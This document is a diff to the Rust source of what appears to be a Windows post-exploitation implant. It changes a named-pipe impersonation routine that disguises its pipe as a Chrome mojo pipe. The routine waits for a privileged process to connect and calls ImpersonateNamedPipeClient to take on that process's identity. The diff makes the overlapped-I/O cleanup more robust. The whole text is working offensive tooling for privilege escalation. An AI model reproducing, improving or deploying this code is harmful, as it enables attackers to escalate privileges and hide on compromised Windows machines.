@@ -520,32 +520,31 @@ fn reg_delete_key(subkey: &str) {
 
 // ── Named pipe impersonation ──────────────────────────────────────────────────
 //
-// Creates a named pipe, waits up to 30s for a privileged process to connect
-// (operator triggers via a file operation or PrintSpooler coerce),
+// Creates an overlapped pipe and waits 15s for a privileged process to connect,
 // then calls ImpersonateNamedPipeClient.
+// GetOverlappedResult(bWait=TRUE) is called after CancelIoEx to drain the
+// cancelled I/O before closing handles — without this the pipe handle close
+// can race with the kernel completion and hang indefinitely.
 
 #[cfg(target_os = "windows")]
 fn pipe_impersonate() -> TaskOutput {
     use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
+    use windows_sys::Win32::System::IO::{CancelIoEx, GetOverlappedResult, OVERLAPPED};
     use windows_sys::Win32::System::Pipes::{
         ConnectNamedPipe, CreateNamedPipeA, DisconnectNamedPipe,
         PIPE_READMODE_BYTE, PIPE_TYPE_BYTE, PIPE_WAIT,
     };
-    const PIPE_ACCESS_DUPLEX: u32 = 3;
-    const NMPWAIT_USE_DEFAULT_WAIT: u32 = 0;
+    use windows_sys::Win32::System::Threading::{CreateEventA, WaitForSingleObject};
+    const PIPE_ACCESS_DUPLEX:   u32 = 3;
+    const FILE_FLAG_OVERLAPPED: u32 = 0x4000_0000;
+    const WAIT_OBJECT_0:        u32 = 0;
+    const NMPWAIT_USE_DEFAULT:  u32 = 0;
 
-    // Pick a benign-looking pipe name
     let pipe_name = format!("\\\\.\\pipe\\mojo.{}.google.chrome.{:08X}",
         std::process::id(), rand_u32());
     let cname = match std::ffi::CString::new(pipe_name.as_str()) {
         Ok(c) => c, Err(_) => return TaskOutput::failure("pipe: name error"),
     };
-
-    // Use overlapped I/O so ConnectNamedPipe doesn't block forever
-    use windows_sys::Win32::System::IO::{OVERLAPPED, CancelIoEx};
-    use windows_sys::Win32::System::Threading::{CreateEventA, WaitForSingleObject};
-    const WAIT_OBJECT_0: u32 = 0;
-    const FILE_FLAG_OVERLAPPED: u32 = 0x40000000;
 
     let event = unsafe { CreateEventA(core::ptr::null(), 1, 0, core::ptr::null()) };
     if event == 0 { return TaskOutput::failure("pipe: CreateEvent failed"); }
@@ -555,9 +554,7 @@ fn pipe_impersonate() -> TaskOutput {
             cname.as_ptr() as *const u8,
             PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
             PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
-            1, 4096, 4096,
-            NMPWAIT_USE_DEFAULT_WAIT,
-            core::ptr::null(),
+            1, 4096, 4096, NMPWAIT_USE_DEFAULT, core::ptr::null(),
         )
     };
     if pipe == INVALID_HANDLE_VALUE {
@@ -569,9 +566,11 @@ fn pipe_impersonate() -> TaskOutput {
     ov.hEvent = event;
     unsafe { ConnectNamedPipe(pipe, &mut ov) };
 
-    let pipe_name_out = pipe_name.clone();
     let adv = adv_base();
     if adv == 0 {
+        unsafe { CancelIoEx(pipe, &ov) };
+        let mut n = 0u32;
+        unsafe { GetOverlappedResult(pipe, &ov, &mut n, 1) };
         unsafe { CloseHandle(pipe); CloseHandle(event) };
         return TaskOutput::failure("pipe: advapi32 not found");
     }
@@ -591,16 +590,25 @@ fn pipe_impersonate() -> TaskOutput {
             unsafe { core::mem::transmute::<_, GetUserFn>(c) },
         ),
         _ => {
-            unsafe { CancelIoEx(pipe, &ov); CloseHandle(pipe); CloseHandle(event) };
+            unsafe { CancelIoEx(pipe, &ov) };
+            let mut n = 0u32;
+            unsafe { GetOverlappedResult(pipe, &ov, &mut n, 1) };
+            unsafe { CloseHandle(pipe); CloseHandle(event) };
             return TaskOutput::failure("pipe: fn resolve failed");
         }
     };
 
-    // Wait up to 10 seconds for a client to connect
-    let wait = unsafe { WaitForSingleObject(event, 10_000) };
+    // Wait up to 15 seconds for a privileged process to connect
+    let wait = unsafe { WaitForSingleObject(event, 15_000) };
     if wait != WAIT_OBJECT_0 {
-        unsafe { CancelIoEx(pipe, &ov); CloseHandle(pipe); CloseHandle(event) };
-        return TaskOutput::failure(&format!("pipe: timeout waiting for connection (pipe: {})", pipe_name_out));
+        // Timeout or error — cancel the pending I/O and drain it before closing
+        unsafe { CancelIoEx(pipe, &ov) };
+        let mut n = 0u32;
+        unsafe { GetOverlappedResult(pipe, &ov, &mut n, 1) }; // bWait=TRUE
+        unsafe { CloseHandle(pipe); CloseHandle(event) };
+        return TaskOutput::failure(&format!(
+            "pipe: 15s timeout — no client connected to {}", pipe_name
+        ));
     }
     unsafe { CloseHandle(event) };
 
@@ -610,15 +618,15 @@ fn pipe_impersonate() -> TaskOutput {
         return TaskOutput::failure("pipe: ImpersonateNamedPipeClient failed");
     }
 
-    let mut name = [0u16; 256];
-    let mut len = 256u32;
-    let _ = unsafe { fn_user(name.as_mut_ptr(), &mut len) };
-    let who = if len > 1 { String::from_utf16_lossy(&name[..len as usize - 1]) } else { "unknown".into() };
+    let mut uname = [0u16; 256];
+    let mut ulen = 256u32;
+    let _ = unsafe { fn_user(uname.as_mut_ptr(), &mut ulen) };
+    let who = if ulen > 1 { String::from_utf16_lossy(&uname[..ulen as usize - 1]) } else { "unknown".into() };
 
     unsafe { fn_rev() };
     unsafe { DisconnectNamedPipe(pipe); CloseHandle(pipe) };
 
-    TaskOutput::success(format!("pipe: impersonated {who} via {pipe_name_out}").into_bytes())
+    TaskOutput::success(format!("pipe: impersonated {who} via {}", pipe_name).into_bytes())
 }
 
 #[cfg(target_os = "windows")]
